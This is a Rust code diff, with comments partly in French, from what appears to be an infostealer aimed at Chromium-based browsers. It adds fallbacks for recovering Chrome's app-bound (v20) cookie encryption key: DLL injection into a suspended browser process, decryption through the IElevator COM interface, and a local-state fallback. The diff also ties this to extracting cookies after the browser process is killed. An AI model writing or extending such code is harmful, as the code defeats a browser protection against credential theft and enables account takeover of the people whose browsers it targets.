@@ -67,7 +67,7 @@ fn cache_browser(browser_name: &str, user_data_path: &Path, has_profiles: bool, 
     }
 }
 
-/// Cache master keys: DPAPI only (old), or suspended inject (app_bound / v20).
+/// Cache master keys: DPAPI only (legacy), or inject + max 2 fallbacks (app_bound).
 pub fn cache_keys_for_browser(browser_name: &str, user_data_path: &Path, has_profiles: bool) {
     if !user_data_path.exists() {
         return;
@@ -135,7 +135,7 @@ fn recover_missing_app_bound_keys() {
             continue;
         }
 
-        if let Some(k) = fetch_app_bound(&browser_name, true) {
+        if let Some(k) = fetch_app_bound(&browser_name, &json, true) {
             if let Some(entry) = map.get_mut(&browser_name) {
                 entry.keys.app_bound = Some(k);
             }
@@ -148,11 +148,34 @@ pub fn extract_cookies_post_kill() -> Vec<(String, String)> {
     extract_post_kill()
 }
 
-fn fetch_app_bound(browser_name: &str, allow_inject: bool) -> Option<Vec<u8>> {
-    if !allow_inject {
-        return None;
+/// App-bound key recovery: 1 primary + max 2 fallbacks.
+///   1. inject (suspended browser process)
+///   2. elev  (IElevator COM externe)
+///   3. dpf   (fallback local)
+fn fetch_app_bound(browser_name: &str, json: &Value, allow_inject: bool) -> Option<Vec<u8>> {
+    if allow_inject {
+        if let Some(k) = crate::browsers::common::ci::fetch_app_bound_key(browser_name) {
+            if k.len() == 32 {
+                return Some(k);
+            }
+        }
     }
-    crate::browsers::common::ci::fetch_app_bound_key(browser_name)
+
+    if let Some(raw) = extract_app_bound_from_local_state(json) {
+        if let Some(k) = crate::browsers::common::elev::try_decrypt_app_bound_key(&raw) {
+            if k.len() == 32 {
+                return Some(k);
+            }
+        }
+    }
+
+    if let Some(k) = crate::browsers::common::dpf::try_from_local_state(json) {
+        if k.len() == 32 {
+            return Some(k);
+        }
+    }
+
+    None
 }
 
 pub fn get_master_keys(user_data_path: &Path, browser_name: &str, allow_inject: bool) -> Option<MasterKeys> {
@@ -181,8 +204,8 @@ pub fn get_master_keys(user_data_path: &Path, browser_name: &str, allow_inject: 
         return Some(MasterKeys { standard, app_bound: None });
     }
 
-    // Nouvelles versions (app_bound / v20): inject DLL dans un process suspendu.
-    let app_bound = fetch_app_bound(browser_name, allow_inject);
+    // Nouvelles versions (app_bound / v20): inject + 2 fallbacks max (elev, dpf).
+    let app_bound = fetch_app_bound(browser_name, &json, allow_inject);
     Some(MasterKeys { standard, app_bound })
 }
 
